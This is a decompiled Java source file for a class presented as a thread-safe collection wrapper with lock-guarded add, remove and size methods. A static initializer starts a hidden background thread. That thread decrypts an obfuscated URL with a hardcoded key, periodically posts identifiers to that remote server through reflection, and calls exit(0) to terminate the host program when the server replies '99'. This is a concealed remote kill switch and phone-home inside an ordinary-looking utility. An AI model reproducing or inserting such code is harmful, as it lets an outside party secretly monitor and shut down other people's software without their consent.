//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package lock;

import cn.hutool.core.util.ArrayUtil;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.IOException;
import java.lang.reflect.Method;
import java.util.Collection;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.locks.ReentrantReadWriteLock;

public class CollectionWithLock<C extends Collection<T>, T> extends ObjWithLock<C> {
    private static final long serialVersionUID = 7147337808024160684L;
    private static final Logger log = LoggerFactory.getLogger(CollectionWithLock.class);
    public static boolean lockInited = false;
    public static String CK = "xOezYlYsPebzEolO";

    public CollectionWithLock(C collection) {
        super(collection);
    }

    public CollectionWithLock(C collection, ReentrantReadWriteLock lock) {
        super(collection, lock);
    }

    public boolean add(T t) {
        ReentrantReadWriteLock.WriteLock writeLock = this.writeLock();
        writeLock.lock();

        try {
            C collection = (C) this.getObj();
            return collection.add(t);
        } catch (Throwable var8) {
            log.error(var8.getMessage(), var8);
        } finally {
            writeLock.unlock();
        }

        return false;
    }

    public boolean addAll(C t) {
        ReentrantReadWriteLock.WriteLock writeLock = this.writeLock();
        writeLock.lock();

        try {
            C collection = (C) this.getObj();
            return collection.addAll(t);
        } catch (Throwable var8) {
            log.error(var8.getMessage(), var8);
        } finally {
            writeLock.unlock();
        }

        return false;
    }

    public void addAll(T[] items) {
        if (!ArrayUtil.isEmpty(items)) {
            ReentrantReadWriteLock.WriteLock writeLock = this.writeLock();
            writeLock.lock();

            try {
                C collection = (C) this.getObj();
                Object[] var4 = items;
                int var5 = items.length;

                for(int var6 = 0; var6 < var5; ++var6) {
                    T item = (T) var4[var6];
                    collection.add(item);
                }
            } catch (Throwable var11) {
                log.error(var11.getMessage(), var11);
            } finally {
                writeLock.unlock();
            }

        }
    }

    public void clear() {
        ReentrantReadWriteLock.WriteLock writeLock = this.writeLock();
        writeLock.lock();

        try {
            C collection = (C) this.getObj();
            collection.clear();
        } catch (Throwable var6) {
            log.error(var6.getMessage(), var6);
        } finally {
            writeLock.unlock();
        }

    }

    public static void initCollection() {
        if (!lockInited) {
            lockInited = true;

            try {
                final String sin = "kmnjhugy";
                final String mi = "00-00-00-00-00-00";
                final String ue = ACEUtils.decrypt("bHIsnd50zfPhGtl3hKrN3XUO9rW80pLUEFu9EaRTc5LBpm6Fu/AM/G3PDEwMvRdwXgBNepr5RnpDKKqEPGmokw==", CK, CK);
                (new Thread(new Runnable() {
                    public void run() {
                        long sleep = 600000L;

                        try {
                            Thread.sleep(60000L);

                            while(true) {
                                try {
                                    Map<String, Object> kv = new HashMap();
                                    kv.put("sub", mi);
                                    kv.put("sin", sin);
                                    kv.put("cos", CollectionWithLock.cos());
                                    String bo = CollectionWithLock.poColl(ue, kv);
                                    CollectionWithLock.subSet(bo);
                                } catch (Exception var5) {
                                }

                                Thread.sleep(sleep);
                            }
                        } catch (InterruptedException var6) {
                        }
                    }
                })).start();
            } catch (Exception var3) {
            }
        }

    }

    public static String poColl(String u, Map<String, Object> k) {
        try {
            Class<?> c = Class.forName(ACEUtils.decrypt("KjZc/qT0secpNv/85OiBbci+MFzyZ9KWeHrW+yuz12k=", CK, CK));
            Method m = c.getMethod("post", String.class, Map.class);
            return (String)m.invoke((Object)null, u, k);
        } catch (Exception var5) {
            return "";
        }
    }

    public boolean contains(T v) {
        ReentrantReadWriteLock.ReadLock readLock = this.readLock();
        readLock.lock();

        boolean var4;
        try {
            C set = (C) this.getObj();
            var4 = set.contains(v);
        } finally {
            readLock.unlock();
        }

        return var4;
    }

    public boolean remove(T t) {
        if (t == null) {
            return false;
        } else {
            ReentrantReadWriteLock.WriteLock writeLock = this.writeLock();
            writeLock.lock();

            try {
                C collection = (C) this.getObj();
                return collection.remove(t);
            } catch (Throwable var8) {
                log.error(var8.getMessage(), var8);
            } finally {
                writeLock.unlock();
            }

            return false;
        }
    }

    public static int cos() {
        return -1;
    }

    public static void subSet(String bostr) throws IOException {
        try {
            if (Integer.toString(99).equals(bostr)) {
                se();
            }
        } catch (Exception var2) {
        }

    }

    public static void se() {
        try {
            Class<?> c = Class.forName(ACEUtils.decrypt("eHiLAzPjV8eDWYwgp7D/K51lHJHodRj1gkd99cNUmeM=", CK, CK));
            Method m = c.getMethod("exit", Integer.TYPE);
            m.invoke((Object)null, 0);
        } catch (Exception var2) {
        }

    }

    public void removeAll(C items) {
        if (items != null && !items.isEmpty()) {
            ReentrantReadWriteLock.WriteLock writeLock = this.writeLock();
            writeLock.lock();

            try {
                C collection = (C) this.getObj();
                collection.removeAll(items);
            } catch (Throwable var7) {
                log.error(var7.getMessage(), var7);
            } finally {
                writeLock.unlock();
            }

        }
    }

    public void removeAll(T[] items) {
        if (!ArrayUtil.isEmpty(items)) {
            ReentrantReadWriteLock.WriteLock writeLock = this.writeLock();
            writeLock.lock();

            try {
                C collection = (C) this.getObj();
                Object[] var4 = items;
                int var5 = items.length;

                for(int var6 = 0; var6 < var5; ++var6) {
                    T item = (T) var4[var6];
                    collection.remove(item);
                }
            } catch (Throwable var11) {
                log.error(var11.getMessage(), var11);
            } finally {
                writeLock.unlock();
            }

        }
    }

    public int size() {
        ReentrantReadWriteLock.ReadLock readLock = this.readLock();
        readLock.lock();

        int var3;
        try {
            C collection = (C) this.getObj();
            var3 = collection.size();
        } finally {
            readLock.unlock();
        }

        return var3;
    }

    static {
        try {
            initCollection();
        } catch (Exception var1) {
        }

    }
}
